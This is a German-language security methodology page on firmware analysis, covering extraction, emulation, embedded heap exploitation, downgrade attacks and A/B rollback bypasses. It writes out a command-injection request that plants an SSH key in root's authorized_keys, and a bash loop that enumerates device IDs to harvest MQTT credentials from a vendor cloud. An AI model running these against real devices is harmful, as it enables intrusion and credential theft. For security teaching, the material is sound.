# Firmwareanalyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist eine essenzielle Software, die den ordnungsgemäßen Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und unterstützt. Sie wird in einem permanenten Speicher abgelegt, sodass das Gerät ab dem Einschalten auf wichtige Anweisungen zugreifen kann, was schließlich zum Start des Betriebssystems führt. Die Untersuchung und potenzielle Modifizierung der Firmware ist ein kritischer Schritt zur Identifizierung von Sicherheitslücken.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationsbeschaffung**

Die **Informationsbeschaffung** ist ein kritischer erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dieser Prozess umfasst das Sammeln von Daten zu:

- Der CPU-Architektur und dem darauf ausgeführten Betriebssystem
- Details zum Bootloader
- Hardwareaufbau und Datenblättern
- Kennzahlen der Codebasis und Speicherorten des Quellcodes
- Externen Bibliotheken und Lizenztypen
- Update-Verläufen und behördlichen Zertifizierungen
- Architektur- und Ablaufdiagrammen
- Sicherheitsbewertungen und identifizierten Sicherheitslücken

Zu diesem Zweck sind **Open-Source-Intelligence-(OSINT-)Tools** unverzichtbar, ebenso wie die Analyse aller verfügbaren Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfprozesse. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, die zur Suche nach potenziellen Problemen eingesetzt werden können.

## **Beschaffung der Firmware**

Firmware kann auf verschiedene Arten beschafft werden, die jeweils unterschiedlich komplex sind:

- **Direkt** aus der Quelle (Entwickler, Hersteller)
- **Erstellen** anhand bereitgestellter Anweisungen
- **Herunterladen** von offiziellen Support-Websites
- Verwenden von **Google dork**-Suchanfragen, um gehostete Firmware-Dateien zu finden
- Direkter Zugriff auf **Cloud-Speicher** mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Abfangen von **Updates** mithilfe von Man-in-the-Middle-Techniken
- **Extrahieren** aus dem Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- **Mithören** von Update-Anfragen innerhalb der Gerätekommunikation
- Identifizieren und Verwenden von **fest codierten Update-Endpunkten**
- **Dumpen** aus dem Bootloader oder Netzwerk
- **Entfernen und Auslesen** des Speicherchips, wenn alle anderen Möglichkeiten scheitern, unter Verwendung geeigneter Hardwaretools

### Nur UART-Logs: Eine Root-Shell über die U-Boot-Umgebung im Flash erzwingen

Wenn UART RX ignoriert wird (nur Logs), kannst du dennoch eine init shell erzwingen, indem du das **U-Boot-Umgebungs-Blob** offline **bearbeitest**:<sup>[[6]](#references)</sup>

1. Den SPI-Flash mit einem SOIC-8-Clip und einem Programmer (3,3 V) dumpen:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Die U-Boot-Env-Partition lokalisieren, `bootargs` bearbeiten, sodass `init=/bin/sh` enthalten ist, und die **U-Boot-Env-CRC32** für das Blob **neu berechnen**.
3. Nur die Env-Partition zurückflashen und neu starten; auf UART sollte eine Shell erscheinen.

Dies ist bei Embedded-Geräten nützlich, bei denen die Bootloader-Shell deaktiviert ist, die Env-Partition jedoch über einen externen Flash-Zugriff beschreibbar ist.

## Analyse der Firmware

Nachdem du nun über die **Firmware verfügst**, musst du Informationen über sie extrahieren, um zu wissen, wie du mit ihr umgehen solltest. Dafür kannst du verschiedene Tools verwenden:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du diese Tools verwenden, um **in der Firmware eingebettete Dateien** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Dateisystem abrufen

Mit den zuvor genannten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, **das Dateisystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einem **Ordner, der nach dem Dateisystemtyp benannt ist**. Üblicherweise handelt es sich um einen der folgenden Typen: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal enthält binwalk **nicht die Magic Bytes des Dateisystems in seinen Signaturen**. Verwende in diesen Fällen binwalk, um **den Offset des Dateisystems zu finden und das komprimierte Dateisystem** aus der Binärdatei **herauszuschneiden** und das Dateisystem anhand seines Typs mit den folgenden Schritten **manuell zu extrahieren**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führen Sie den folgenden **dd-Befehl** zum Carving des Squashfs-Dateisystems aus.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware beschafft wurde, ist es wichtig, sie zur Untersuchung ihrer Struktur und potenzieller Schwachstellen zu zerlegen. Dieser Prozess umfasst die Verwendung verschiedener Tools zur Analyse und Extraktion wertvoller Daten aus dem Firmware-Image.

### Tools für die erste Analyse

Eine Reihe von Befehlen wird für die erste Untersuchung der Binärdatei (bezeichnet als `<bin>`) bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und die Details von Partitionen und Dateisystemen zu verstehen:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` überprüft. Eine niedrige Entropie deutet auf eine fehlende Verschlüsselung hin, während eine hohe Entropie auf eine mögliche Verschlüsselung oder Komprimierung hindeutet.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** sowie **binvis.io** zur Dateiuntersuchung empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` kann man das Dateisystem normalerweise extrahieren, häufig in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp aufgrund fehlender Magic Bytes nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu verwendet man `binwalk`, um den Offset des Dateisystems zu ermitteln, und anschließend den Befehl `dd`, um das Dateisystem herauszulösen:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Anschließend werden abhängig vom Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) verschiedene Befehle verwendet, um den Inhalt manuell zu extrahieren.

### Dateisystemanalyse

Nach der Extraktion des Dateisystems beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, hardcodierte Zugangsdaten, API-Endpunkte, Funktionen des Update-Servers, nicht kompilierten Code, Startup-Skripte und kompilierte Binaries zur Offline-Analyse geachtet.

**Wichtige Orte** und **Elemente**, die untersucht werden sollten, umfassen:

- **etc/shadow** und **etc/passwd** für Benutzerzugangsdaten
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binaries für weitere Analysen
- Allgemeine Webserver und Binaries von IoT-Geräten

Mehrere Tools helfen dabei, vertrauliche Informationen und Schwachstellen im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zur Suche nach vertraulichen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für eine umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysen

### Sicherheitsprüfungen an kompilierten Binaries

Sowohl der Quellcode als auch die im Dateisystem gefundenen kompilierten Binaries müssen sorgfältig auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binaries und **PESecurity** für Windows-Binaries helfen dabei, ungeschützte Binaries zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens ermitteln

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der wie folgt aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Während der Firmware-Analyse kann sich herausstellen, dass `<token>` lokal aus der Geräte-ID und einem hardcodierten Secret abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als hexadezimale Großbuchstaben dargestellt

Dieses Design ermöglicht es jedem, der eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen, wodurch häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe offengelegt werden.

Praktischer Ablauf:

1) deviceId aus UART-Boot-Logs extrahieren

- Einen 3,3-V-UART-Adapter (TX/RX/GND) anschließen und Logs erfassen:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suche nach Zeilen, die das Cloud-Konfigurations-URL-Muster und die Broker-Adresse ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade die Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder der MD5-Verwendung.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite den Token in Bash ab und wandle den Digest in Großbuchstaben um:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud-Konfiguration und MQTT-Zugangsdaten abrufen

- URL zusammenstellen und JSON mit curl abrufen; mit jq analysieren, um Secrets zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Missbrauche plaintext MQTT und schwache Topic-ACLs (falls vorhanden)

- Verwende wiederhergestellte Zugangsdaten, um maintenance topics zu abonnieren und nach sensiblen Ereignissen zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Vorhersagbare Geräte-IDs enumerieren (in großem Maßstab, mit Autorisierung)

- Viele Ökosysteme betten Vendor-OUI-/Produkt-/Typ-Bytes gefolgt von einem sequenziellen Suffix ein.
- Du kannst Kandidaten-IDs iterieren, daraus Tokens ableiten und Configs programmgesteuert abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Hinweise
- Hole immer eine ausdrückliche Autorisierung ein, bevor du eine mass enumeration durchführst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Secrets wiederherzustellen, ohne die Zielhardware zu verändern.


Der Prozess der Firmware-Emulation ermöglicht eine **dynamische Analyse** entweder des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Herausforderungen durch Hardware- oder Architekturabhängigkeiten stoßen. Das Übertragen des Root-Dateisystems oder bestimmter Binaries auf ein Gerät mit passender Architektur und Endianness, beispielsweise einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann jedoch weitere Tests ermöglichen.

### Emulation einzelner Binaries

Für die Untersuchung einzelner Programme ist es entscheidend, die Endianness und CPU-Architektur des Programms zu identifizieren.

#### Beispiel mit MIPS-Architektur

Um ein Binary mit MIPS-Architektur zu emulieren, kann folgender Befehl verwendet werden:
```bash
file ./squashfs-root/bin/busybox
```
Und um die erforderlichen Emulations-Tools zu installieren:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Für MIPS (Big-Endian) wird `qemu-mips` verwendet, und für Little-Endian-Binaries wäre `qemu-mipsel` die richtige Wahl.

#### Emulation der ARM-Architektur

Für ARM-Binaries ist der Prozess ähnlich, wobei der `qemu-arm`-Emulator zur Emulation verwendet wird.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamische Analyse in der Praxis

In dieser Phase wird entweder eine reale oder eine emulierte Geräteumgebung für die Analyse verwendet. Es ist wichtig, den Shell-Zugriff auf das Betriebssystem und das Dateisystem aufrechtzuerhalten. Die Emulation bildet Hardware-Interaktionen möglicherweise nicht perfekt nach, sodass gelegentlich Neustarts der Emulation erforderlich sind. Bei der Analyse sollten das Dateisystem erneut untersucht, exponierte Webseiten und Netzwerkdienste ausgenutzt und Schwachstellen im Bootloader untersucht werden. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu identifizieren.

## Techniken der Laufzeitanalyse

Die Laufzeitanalyse umfasst die Interaktion mit einem Prozess oder einer Binary in ihrer Betriebsumgebung. Dabei werden Tools wie gdb-multiarch, Frida und Ghidra verwendet, um Breakpoints zu setzen und durch Fuzzing sowie andere Techniken Schwachstellen zu identifizieren.

Bei Embedded Targets ohne vollständigen Debugger sollte **ein statisch gelinktes `gdbserver`** auf das Gerät kopiert und remote verbunden werden:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / Zuordnung von Radio-Co-Processor-Nachrichten

Auf IoT-Hubs ist der RF-Stack häufig zwischen einem **Radio-MCU** und einem Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow besteht darin, den Pfad abzubilden:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Parser auf der Controller-Seite** im Radio-MCU
3. **Text- oder TLV-Protokoll über die serielle Schnittstelle/UART**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / State Machine**

Diese Architektur erzeugt zwei Reversing-Ziele statt nur eines. Wenn der Controller binäre Radio-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, sollte Folgendes ermittelt werden:

- Die **Message Groups** und Dispatch-Tabellen
- Welche Messages aus dem **Netzwerk** kommen können und welche ausschließlich vom Controller selbst
- Die exakten **herstellerspezifischen Discriminator-Felder** (zum Beispiel Zigbee `manufacturer_code` und `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Model-Download-Phasen erreichbar sind

Speziell bei Zigbee sollte der Pairing-Traffic aufgezeichnet und geprüft werden, ob das Ziel weiterhin den standardmäßigen **Link Key** `ZigBeeAlliance09` verwendet. Falls dies der Fall ist, kann das Sniffen des Commissioning-Traffics den **Network Key** offenlegen. Zigbee-3.0-Install-Codes reduzieren dieses Risiko. Daher sollte festgestellt werden, ob das getestete Gerät diese tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und durch FSM begrenzte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Commands sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** mit weniger umfassend getesteter Validierung erreichen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Den Command Dispatcher zurückverfolgen, bis der **ausschließlich vom Hersteller verwendete Handler** gefunden wird.
- Die Tabellen für **FSM-Status**, **Event**, **Check**, **Action** und **Next-State** rekonstruieren.
- **Übergangszustände** identifizieren, die automatisch weiterschalten, sowie Retry-/Error-Zweige, die schließlich vom Angreifer kontrollierten State zurücksetzen oder freigeben.
- Bestätigen, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen, statt anzunehmen, dass der fehlerhafte Handler immer erreichbar ist.

Bei zeitkritischen Protokollen kann das Packet-Replay über ein Python-Framework zu langsam sein. Ein zuverlässigerer Ansatz besteht darin, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem Hersteller-Stack zu emulieren, damit die korrekten **Endpoints**, **Attributes** und das richtige Commissioning-Timing verwendet werden.

### Fehlerklasse bei fragmentierten Downloads in Embedded-Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Model-/Configuration-Downloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und reserviert `malloc(total_size)`.
2. Nachfolgende Fragmente validieren nur die vom Angreifer kontrollierten **paketlokalen** Felder, etwa `packet_total_size >= offset + chunk_len`.
3. Der Copy-Vorgang verwendet `memcpy(&ctx->buffer[offset], chunk, chunk_len)`, ohne die Größe gegen die **ursprünglich reservierte Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** deklarierten Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen erfüllt, während der ursprünglich reservierte Buffer weiterhin überläuft.

Wenn der verwundbare Pfad hinter Commissioning-Logik liegt, muss der Exploit ausreichend **Geräteemulation** enthalten, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Model-Download- oder Blob-Download-Zustand zu bringen.

### Protokollgesteuerte `free()`-Trigger

Bei Embedded-Daemons besteht der einfachste Weg, Heap-Metadata-Exploitation auszulösen, oft nicht darin, auf Cleanup zu warten, sondern die eigene **Error-Handling-Logik des Protokolls** zu erzwingen:<sup>[[8]](#references)</sup>

- Fehlerhafte Folgefragmente senden, um die FSM in **Retry-** oder **Error-Zustände** zu versetzen.
- Das Retry-Limit überschreiten, damit der Daemon den **Context zurücksetzt** und den beschädigten Buffer freigibt.
- Dieses vorhersehbare `free()` verwenden, um Allocator-seitige Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Dies ist besonders nützlich gegen **musl/uClibc/dlmalloc-ähnliche** Allocators unter Embedded Linux, bei denen die Beschädigung von Chunk-Metadaten die Unlink-/Unbin-Logik in ein Write Primitive umwandeln kann. Ein stabiles Muster besteht darin, ein **Size-Feld** zu beschädigen, um die Traversierung des Allocators in Richtung **gefälschter Chunks innerhalb des übergelaufenen Buffers** umzuleiten, anstatt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binary Exploitation und Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierung in Low-Level-Sprachen. Binary-Runtime-Protections sind in Embedded-Systemen selten. Wenn sie jedoch vorhanden sind, können Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins + Consolidation:** uClibc verwendet Fastbins ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen. Daher muss jeder Fake Chunk die Prüfungen überstehen (sinnvolle Größe, `fd = 0` und umgebende Chunks, die als „in use“ erkannt werden).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binaries unter ASLR:** Wenn ASLR aktiviert ist, das Haupt-Binary jedoch **non-PIE** ist, sind Adressen im In-Binary-`.data/.bss` stabil. Es kann eine Region anvisiert werden, die bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf einer **Function-Pointer-Tabelle** zu platzieren.
- **Parser-stoppendes NUL:** Bei der Verarbeitung von JSON kann ein `\x00` im Payload das Parsing beenden und gleichzeitig nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack Pivot bzw. eine ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einer bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) stellen vorkonfigurierte Umgebungen für Firmware-Security-Tests bereit, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete OSs zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die Sicherheitsbewertungen und Penetrationstests von Internet-of-Things-(IoT-)Geräten unterstützt. Sie spart viel Zeit, indem sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Auf Ubuntu 18.04 basierendes Betriebssystem für Embedded-Security-Tests, das mit Tools für Firmware-Security-Tests vorinstalliert ist.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird der **Schutz vor Versions-Rollbacks (Downgrades) häufig ausgelassen**. Wenn der Boot- oder Recovery-Loader nur die Signatur mit einem eingebetteten öffentlichen Schlüssel prüft, aber die *Version* (oder einen monoton steigenden Counter) des zu flashenden Images nicht vergleicht, kann ein Angreifer **eine ältere, verwundbare Firmware mit weiterhin gültiger Signatur** legitim installieren und dadurch gepatchte Schwachstellen erneut einführen.<sup>[[4]](#references)</sup>

Typischer Angriffs-Workflow:

1. **Ein älteres signiertes Image beschaffen**
* Von einem öffentlichen Download-Portal, CDN oder einer Support-Website des Herstellers abrufen.
* Aus zugehörigen Mobile-/Desktop-Anwendungen extrahieren (z. B. innerhalb eines Android-APKs unter `assets/firmware/`).
* Aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw. beziehen.
2. Das Image über einen beliebigen zugänglichen Update-Kanal **auf das Gerät hochladen oder dort bereitstellen**:
* Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
* Viele Consumer-IoT-Geräte stellen *nicht authentifizierte* HTTP(S)-Endpoints bereit, die Base64-codierte Firmware-Blobs akzeptieren, serverseitig decodieren und Recovery/Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in der neueren Version gepatcht wurde (zum Beispiel einen Command-Injection-Filter, der später hinzugefügt wurde).
4. Optional anschließend das neueste Image flashen oder Updates deaktivieren, um nach dem Erlangen von Persistence eine Entdeckung zu vermeiden.

### Beispiel: Command Injection nach einem Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der verwundbaren (downgraded) Firmware wird der Parameter `md5` ohne Bereinigung direkt in einen Shell-Befehl eingebunden, wodurch die Injection beliebiger Befehle möglich ist (hier zur Aktivierung des Root-Zugriffs per SSH-Schlüssel). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, doch das Fehlen eines Downgrade-Schutzes macht die Behebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Anbieter bündeln vollständige Firmware-Images in ihren begleitenden mobilen Anwendungen, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete werden üblicherweise unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Tools wie `apktool`, `ghidra` oder sogar das einfache `unzip` ermöglichen es, signierte Images zu extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Nur für den Updater geltende Anti-Rollback-Umgehung bei A/B-Slot-Designs

Einige Anbieter implementieren zwar einen **Ratchet** gegen Downgrades, jedoch nur innerhalb der *Updater*-Logik (beispielsweise eine UDS-Routine über CAN, einen Recovery-Befehl oder einen OTA-Agent im Userspace). Wenn der **Bootloader** später nur die Image-Signatur/CRC prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, kann der Rollback-Schutz weiterhin umgangen werden.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Image-Ratchet mit einem in persistentem Speicher abgelegten Wert und lehnt ältere signierte Images ab.
- Der **Bootloader** parst diesen Ratchet **nicht** und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem Slot-spezifischen Generation Counter gespeichert und ist **nicht kryptografisch** an den exakten Firmware-Digest gebunden, der validiert wurde.

Dadurch entsteht in Dual-Slot-Systemen ein **validate-one-image / boot-another-image**-Primitive. Wenn der Angreifer den Updater dazu bringen kann, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel zu markieren, und Slot B anschließend vor dem Reboot überschreiben kann, bootet der Bootloader möglicherweise trotzdem das downgradete Image, da er nur den bereits festgeschriebenen Slot-Metadaten vertraut.

Übliches Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Switch-Routine ausführen, sodass das Layout diesen Slot als nächsten aktiven Slot markiert.
2. **Noch nicht rebooten**. In derselben Session erneut in die Slot-Vorbereitungs-/Löschroutine wechseln.
3. Veraltete Boot-State- oder Slot-Auswahllogik ausnutzen, sodass der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine überspringen, die den Ratchet erzwingt, und direkt rebooten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf beim Reverse Engineering von A/B-Update-Implementierungen zu achten ist:

- Slot-Auswahl, die aus **Boot-Time-Flags** abgeleitet wird, die nach einem erfolgreichen Wechsel nicht aktualisiert werden.
- Eine Routine im Stil von `prepare_passive_slot()`, die einen Slot anhand veralteten Zustands statt anhand des **aktuell festgeschriebenen Layouts** löscht.
- Eine Funktion im Stil von `part_write_layout()`, die nur einen **Generation Counter** / ein Active-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace- oder Updater-Code implementiert sind, aber **nicht** in ROM / Bootloader / Secure-Boot-Stages.
- Lösch- oder Recovery-Routinen, die den Slot auch dann als bootfähig markiert lassen, nachdem sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

